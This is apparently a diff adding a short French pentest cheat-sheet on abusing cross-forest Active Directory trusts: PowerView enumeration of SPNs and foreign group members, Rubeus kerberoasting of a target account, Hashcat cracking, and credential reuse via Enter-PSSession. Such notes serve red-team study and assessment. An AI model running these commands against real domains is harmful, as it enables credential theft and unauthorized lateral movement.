@@ -1,0 +1,21 @@
+##Cross-Forest Domain Trust Abuse
+
+Les attaques kerberoasting et ASREPRoasting sont possibles d'un domaine à un autre en fonction
+du lien d'approbation présent.
+
+#Depuis WINDOWS
+Enumération des SPN d'un domaine associé avec PWView
+Get-DomainUser -SPN -Domain <FOREIGN_DOM> | select SamAccountName
+Enumérer le compte cible:
+Get-DomainUser -Domain <FOREIGN_DOM> -Identity <account_cible> |select SamAccountName,memberof
+--> Si groupes intéressants: kerberoasting avec Rubeus.exe
+.\Rubeus.exe kerberoast /domain:<FOREIGN_Dom> /user:<user_cible> /nowrap
+Puis crack avec Hashcat
+
+
+Pass Re-Use
+Controler si un admin d'un domain compromis a des droits sur un domaine lié
+Get-DomainForeignGroupMember -Domain <FOREIGN_DOM>
+Convert-SidToName <SID>
+-->Si le SID correspond aussi à un compte sur le domaine
+Enter-PSSession -ComputerName <MACHINE_CIBLE_FQDN> -Credential <compte lié sur domaine>
